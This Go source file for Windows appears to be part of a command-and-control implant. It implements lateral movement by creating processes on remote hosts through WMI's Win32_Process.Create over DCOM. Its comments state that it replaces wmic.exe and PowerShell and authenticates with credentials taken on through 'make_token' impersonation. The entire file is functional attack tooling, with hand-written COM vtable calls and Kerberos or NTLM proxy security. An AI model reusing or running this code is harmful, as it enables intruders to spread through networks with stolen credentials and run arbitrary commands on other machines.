//go:build windows

package main

import (
	"errors"
	"fmt"
	"runtime"
	"syscall"
	"unsafe"
)

// Native WMI lateral execution: a COM/DCOM call chain replaces wmic.exe and
// its PowerShell fallback. The lateral child process runs under the active
// make_token identity, so the DCOM authentication uses those network
// credentials; without a token it uses the agent's own identity.

const (
	coinitMultithreaded      = 0x0
	clsctxInprocServer       = 0x1
	rpcCAuthnWinnt           = 10
	rpcCAuthnGssKerberos     = 16
	rpcCAuthzNone            = 0
	rpcCAuthnLevelDefault    = 0
	rpcCAuthnLevelPktPrivacy = 6
	rpcCImpLevelImpersonate  = 3
	eoacNone                 = 0x0
	vtBstr                   = 8
	vtI4                     = 3
	cimString                = 8
)

var (
	ole32                 = syscall.NewLazyDLL("ole32.dll")
	oleaut32              = syscall.NewLazyDLL("oleaut32.dll")
	procCoInitializeEx    = ole32.NewProc("CoInitializeEx")
	procCoInitializeSec   = ole32.NewProc("CoInitializeSecurity")
	procCoUninitialize    = ole32.NewProc("CoUninitialize")
	procCoCreateInstance  = ole32.NewProc("CoCreateInstance")
	procCoSetProxyBlanket = ole32.NewProc("CoSetProxyBlanket")
	procSysAllocString    = oleaut32.NewProc("SysAllocString")
	procSysFreeString     = oleaut32.NewProc("SysFreeString")
)

type comGUID struct {
	data1 uint32
	data2 uint16
	data3 uint16
	data4 [8]byte
}

var (
	clsidWbemLocator = comGUID{0x4590F811, 0x1D3A, 0x11D0, [8]byte{0x89, 0x1F, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24}}
	iidIWbemLocator  = comGUID{0xDC12A687, 0x737F, 0x11CF, [8]byte{0x88, 0x4D, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24}}
)

// variant holds a BSTR or I4 VARIANT value; the layout matches the x64
// VARIANT header followed by the union.
type variant struct {
	vt       uint16
	reserved [6]byte
	value    uintptr
	tail     [8]byte
}

// comCall invokes a COM interface method by vtable slot. All arguments must
// be pointer-sized; the x64 calling convention ignores the extra ones the
// callee does not read.
func comCall(iface, slot uintptr, args ...uintptr) error {
	vtable := *(*uintptr)(unsafe.Pointer(iface))
	method := *(*uintptr)(unsafe.Pointer(vtable + slot*8))
	if method == 0 {
		return errors.New("invalid COM vtable entry")
	}
	result, _, _ := syscall.SyscallN(method, append([]uintptr{iface}, args...)...)
	if result != 0 {
		return fmt.Errorf("COM method %d failed: 0x%08x", slot, result)
	}
	return nil
}

func comRelease(iface uintptr) {
	if iface == 0 {
		return
	}
	vtable := *(*uintptr)(unsafe.Pointer(iface))
	method := *(*uintptr)(unsafe.Pointer(vtable + 16)) // IUnknown::Release
	_, _, _ = syscall.SyscallN(method, iface)
}

func sysAllocString(value string) uintptr {
	pointer, err := syscall.UTF16PtrFromString(value)
	if err != nil {
		return 0
	}
	handle, _, _ := procSysAllocString.Call(uintptr(unsafe.Pointer(pointer)))
	return handle
}

func sysFreeString(handle uintptr) {
	if handle != 0 {
		procSysFreeString.Call(handle)
	}
}

// wmiAuthentication allocates the ConnectServer BSTR and the proxy's UTF-16
// principal. The caller owns the BSTR and must free it with sysFreeString.
func wmiAuthentication(host string) (uintptr, uintptr, *uint16, error) {
	authnSvc := uintptr(rpcCAuthnWinnt)
	var authority uintptr
	var serverPrincipal *uint16
	if !lateralHostIsIP(host) {
		authnSvc = rpcCAuthnGssKerberos
		var err error
		principal := "HOST/" + host
		serverPrincipal, err = syscall.UTF16PtrFromString(principal)
		if err != nil {
			return 0, 0, nil, fmt.Errorf("encode WMI Kerberos server principal: %w", err)
		}
		// ConnectServer requires a length-prefixed BSTR, not an LPCWSTR.
		authority = sysAllocString("kerberos:" + principal)
		if authority == 0 {
			return 0, 0, nil, errors.New("allocate WMI Kerberos authority")
		}
	}
	return authnSvc, authority, serverPrincipal, nil
}

// wmiCreateProcess executes Win32_Process.Create over DCOM with the current
// identity. DNS targets use one HOST SPN for both connection and proxy security.
func wmiCreateProcess(host, command string) error {
	authnSvc, authority, serverPrincipal, err := wmiAuthentication(host)
	if err != nil {
		return err
	}
	defer sysFreeString(authority)
	defer runtime.KeepAlive(serverPrincipal)
	// COM apartments belong to OS threads, not goroutines.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	if hr, _, _ := procCoInitializeEx.Call(0, coinitMultithreaded); hr != 0 && hr != 1 {
		return fmt.Errorf("CoInitializeEx failed: 0x%08x", hr)
	}
	defer procCoUninitialize.Call()
	// Process-wide default security; per-proxy blankets below override it.
	procCoInitializeSec.Call(0, ^uintptr(0), 0, 0,
		rpcCAuthnLevelDefault, rpcCImpLevelImpersonate, 0, eoacNone, 0)
	var locator uintptr
	if hr, _, _ := procCoCreateInstance.Call(
		uintptr(unsafe.Pointer(&clsidWbemLocator)), 0, clsctxInprocServer,
		uintptr(unsafe.Pointer(&iidIWbemLocator)), uintptr(unsafe.Pointer(&locator)),
	); hr != 0 {
		return fmt.Errorf("CoCreateInstance(WbemLocator) failed: 0x%08x", hr)
	}
	defer comRelease(locator)
	namespace := sysAllocString(`\\` + host + `\root\cimv2`)
	defer sysFreeString(namespace)
	if namespace == 0 {
		return errors.New("allocate WMI namespace string")
	}
	var services uintptr
	// IWbemLocator::ConnectServer (slot 3): authenticate with the current
	// process identity, which carries the active make_token credentials.
	if err := comCall(locator, 3, namespace, 0, 0, 0, 0,
		authority, 0,
		uintptr(unsafe.Pointer(&services))); err != nil {
		return fmt.Errorf("WMI connect to %s: %w", host, err)
	}
	defer comRelease(services)
	if hr, _, _ := procCoSetProxyBlanket.Call(
		services, authnSvc, rpcCAuthzNone, uintptr(unsafe.Pointer(serverPrincipal)),
		rpcCAuthnLevelPktPrivacy, rpcCImpLevelImpersonate, 0, eoacNone,
	); hr != 0 {
		return fmt.Errorf("CoSetProxyBlanket failed: 0x%08x", hr)
	}
	classPath := sysAllocString("Win32_Process")
	defer sysFreeString(classPath)
	methodName := sysAllocString("Create")
	defer sysFreeString(methodName)
	if classPath == 0 || methodName == 0 {
		return errors.New("allocate WMI strings")
	}
	var classObject uintptr
	// IWbemServices::GetObject (slot 6).
	if err := comCall(services, 6, classPath, 0, 0,
		uintptr(unsafe.Pointer(&classObject)), 0); err != nil {
		return fmt.Errorf("WMI get Win32_Process on %s: %w", host, err)
	}
	defer comRelease(classObject)
	var inSignature, outSignature uintptr
	// IWbemClassObject::GetMethod (slot 19, including IUnknown).
	if err := comCall(classObject, 19, methodName, 0,
		uintptr(unsafe.Pointer(&inSignature)), uintptr(unsafe.Pointer(&outSignature))); err != nil {
		return fmt.Errorf("WMI get Win32_Process.Create: %w", err)
	}
	if outSignature != 0 {
		defer comRelease(outSignature)
	}
	if inSignature == 0 {
		return errors.New("WMI Create method has no input signature")
	}
	defer comRelease(inSignature)
	var inInstance uintptr
	// IWbemClassObject::SpawnInstance (slot 15).
	if err := comCall(inSignature, 15, 0, uintptr(unsafe.Pointer(&inInstance))); err != nil {
		return fmt.Errorf("WMI spawn Create input: %w", err)
	}
	defer comRelease(inInstance)
	commandLine := sysAllocString(command)
	defer sysFreeString(commandLine)
	if commandLine == 0 {
		return errors.New("allocate WMI command line")
	}
	propertyName, err := syscall.UTF16PtrFromString("CommandLine")
	if err != nil {
		return err
	}
	arguments := variant{vt: vtBstr, value: commandLine}
	// IWbemClassObject::Put (slot 5).
	if err := comCall(inInstance, 5, uintptr(unsafe.Pointer(propertyName)), 0,
		uintptr(unsafe.Pointer(&arguments)), cimString); err != nil {
		return fmt.Errorf("WMI set CommandLine: %w", err)
	}
	var outParams uintptr
	// IWbemServices::ExecMethod (slot 24).
	if err := comCall(services, 24, classPath, methodName, 0, 0, inInstance,
		uintptr(unsafe.Pointer(&outParams)), 0); err != nil {
		return fmt.Errorf("WMI Win32_Process.Create on %s: %w", host, err)
	}
	if outParams == 0 {
		return errors.New("WMI Create returned no output parameters")
	}
	defer comRelease(outParams)
	resultName, err := syscall.UTF16PtrFromString("ReturnValue")
	if err != nil {
		return err
	}
	var returnValue variant
	// IWbemClassObject::Get (slot 4).
	if err := comCall(outParams, 4, uintptr(unsafe.Pointer(resultName)), 0,
		uintptr(unsafe.Pointer(&returnValue)), 0, 0); err != nil {
		return fmt.Errorf("WMI read ReturnValue: %w", err)
	}
	if returnValue.vt == vtI4 && int32(returnValue.value) != 0 {
		return fmt.Errorf("WMI Win32_Process.Create returned %d", int32(returnValue.value))
	}
	return nil
}
